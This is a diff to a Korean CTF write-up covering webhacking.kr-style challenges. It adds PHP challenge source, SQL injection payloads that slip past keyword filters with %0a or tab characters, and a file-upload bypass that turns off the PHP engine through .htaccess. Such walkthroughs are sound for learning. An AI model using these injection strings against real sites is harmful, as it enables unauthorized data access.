@@ -550,7 +550,7 @@ or을 이용해 조건이 항상 참이 되게 하고, 쿼리결과의 반환 �
 SELECT id FROM chall18 WHERE id='guest' and no=1 or 1=1 LIMIT 1,1
 ```
 
-띄어쓰기가 필드에서는 막히는것 같으므로 %0a로 우회하여 url에 넣을 최종 입력값은 다음과 같다.
+띄어쓰기가 필드에서 막히는것 같으므로 %0a로 우회하여 url에 넣을 최종 입력값은 다음과 같다.
 
 `1%0aor%0a1=1%0aLIMIT%0a1,1`
 
@@ -782,3 +782,60 @@ no! 라고 뜬다. 주소창은 admin으로 바뀌어있는 걸 볼때
 # old-27
 
 ___SQL 인젝션___
+
+```PHP
+<?php
+  if($_GET['no']){
+  $db = dbconnect();
+  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
+  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
+  if($r['id']=="guest") echo("guest");
+  if($r['id']=="admin") solve(27); // admin's no = 2
+}
+?>
+```
+
+소스코드를 보니 #, 띄어쓰기와 ( 특수문자, select와 limit 키워드를 필터링한다는 것을 제외하고는 18번 문제와 동일하다.
+
+쿼리를 조작하여 앞의 조건문은 무시하고 원하는 쿼리를 삽입해보자.
+
+`0) or no like 2-- `
+
+이를 삽입하면 쿼리문 전체는 다음과 같이 작동할 것이다. 
+
+```SQL
+select id from chall27 where id='guest' and no=(0) or no like 2-- )")) or die("query error");
+```
+
+앞의 `where id='guest' and no=(0)` 에 해당하는 column은 없으므로 무시되고, 뒤의 `where no like 2` 가 작동하여 admin의 id를 select 할 것이다.
+
+띄어쓰기도 필터링하므로 이를 탭으로 교체하여 url 인코딩하여 주소창에 넣어주면 성공.
+
+![pwned](./pwned/old-27.PNG)
+
+<br>
+
+# old-28
+
+___파일 업로드 공격____
+
+![28-upload](pic/28-upload.PNG)
+
+파일 업로드 공격 문제인것 같다.
+
+flag.php 파일을 excute하는 것이 아니라 read 해야한다. 
+읽기 혹은 쓰기 권한을 변경하기 위해 .htaccess 를 사용할 수 있다. 
+.htaccess 파일은 php 기능을 끄는 옵션을 가지고 있는 파일로, 
+`php_flag_engine off` 옵션을 주면 php 파일을 텍스트 파일처럼 인식하게 하여 소스코드를 읽을 수 있다.
+
+__exploit__: [.htaccess](./code/.htaccess)
+
+문제 깨졌습니다..
+
+![28-error](./pic/28-error.PNG)
+
+<br>
+
+# old-29
+
+______
